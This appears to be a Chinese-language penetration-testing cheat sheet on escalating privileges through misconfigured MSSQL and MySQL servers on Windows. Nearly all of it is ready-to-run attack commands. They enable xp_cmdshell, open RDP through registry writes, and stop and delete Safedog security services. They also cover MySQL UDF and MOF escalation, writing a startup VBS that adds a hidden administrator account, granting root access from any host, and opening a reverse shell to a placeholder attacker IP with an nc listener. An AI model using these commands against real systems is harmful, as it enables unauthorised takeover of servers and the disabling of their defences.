# Windows MSSQL 提权
## 使用 MSSQL 配置不当提权
（1）安装组件
安装cmd_shell组件
`EXEC sp_configure 'show advanced options', 1`
`GO`
`RECONFIGURE`
`GO `
`EXEC sp_configure 'xp_cmdshell', 1`
`GO`
`RECONFIGURE`
`GO`
删除cmd_shell组件
`EXEC sp_configure 'show advanced options', 1`
`GO`
`RECONFIGURE`
`GO`
`EXEC sp_configure 'xp_cmdshell', 0`
`GO`
`RECONFIGURE`
`GO`
（2）开启 3389
开启3389
`exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;--`
关闭3389
`exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',1;`
（3）创建用户
（4）权限提升
system权限的情况下：
`net stop "safedog guard center" /y`
`net stop "safedog update center" /y`
`net stop "safedogguardcenter" /y`
绕过安全狗：
删除安全狗服务：
`sc stop "SafeDogGuardCenter"`
`sc config "SafeDogGuardCenter" start=disabled`
`sc delete "Safedogguardcenter"`
`sc stop "SafeDogupdateCenter"`
`sc config "SafeDogUpdateCenter" start=disabled`
`sc delete "SafedogUpdatecenter"`
`sc stop "SafeDogCloudHeler"`
`sc config "SafeDogCloudHeler" start=disabled`
`sc delete "SafeDogCloudHeler"`



# Windows MYSQL 提权

## Windows mysql udf 提权
原理：通过 root 权限导出 udf. Dll 到系统目录下，可以通过 udf. Dll 调用执行 cmd
（1）查看网站源码里面数据库配置（inc, conn, config. Sql, common, data 等）
（2）查看数据库安装路径下的 user. Myd  (/data/mysql/)下载，本地替换
`mysqld --skip-grant-tables 跳过验证`
`mysql.exe -uroot    进入MySQL`
（3）暴力破解 mysql 密码破解 3306 端口入侵



## Windows mysql启动项提权 （不常用，容易被拦截）
（1）查看我们进入数据库中有些什么数据表
`mysql>show tables;`
默认的情况下，test 中没有任何表的存在。
（2）在 TEST 数据库下创建一个新的表；
`mysql>create table a (cmd text);`
好了，我们创建了一个新的表，表名为 a，表中只存放一个字段，字段名为 cmd，为 text 文本。
（3）在表中插入内容
`mysql>insert into a values ("set wshshell=createobject (""wscript.shell"")");`
`mysql>insert into a values ("a=wshshell.run (""cmd.exe /c net user 1 1 /add"",0)");`
`mysql>insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup Administrators 1 /add"",0)");`
**注意双引号和括号以及后面的“0”一定要输入！我们将用这三条命令来建立一个 VBS 的脚本程序！**
（4）好了，现在我们来看看表 a 中有些什么
`mysql>select * from a;`
我们将会看到表中有三行数据，就是我们刚刚输入的内容，确认你输入的内容无误后，我们来到下一步
（5）输出表为一个 VBS 的脚本文件
`mysql>select * from a into outfile "c://docume~1//administrator//「开始」菜单//程序//启动//a.vbs";`
（6）重启即可



## Windows mysql mof 提权
（1）上传 mof. Php，输入相关信息，执行命令，提权。
（2）上传文件x.mof，使用 select 命令导出入到正确位置
`select load_file('C:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'
（3）允许外部地址使用 root 用户连接的 sql 语句
`Grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option;`



## Windows mysql 反链端口提权 
原理：让调出的 cmd 反向连接黑客，一般 waf 拦截进入的流量，不拦截出去的流量，所以可以使用[[ReverseShell|反弹链接]]过掉 waf
（1）利用 mysql 客户端工具连接 mysql 服务器，然后执行下面的操作。
执行命令
`mysql.exe -h 172.16.10.11 -uroot -p`
`Enter password:`
`mysql> \. c:\mysql.txt`
`mysql>select backshell("YourIP",2010);`
（2）本地监听你[[ReverseShell|反弹]]的端口
`nc.exe -vv -l -p 2010`
成功后，你将获得一个 system 权限的 cmdshell，其实这个也是利用的 UDF 提权。

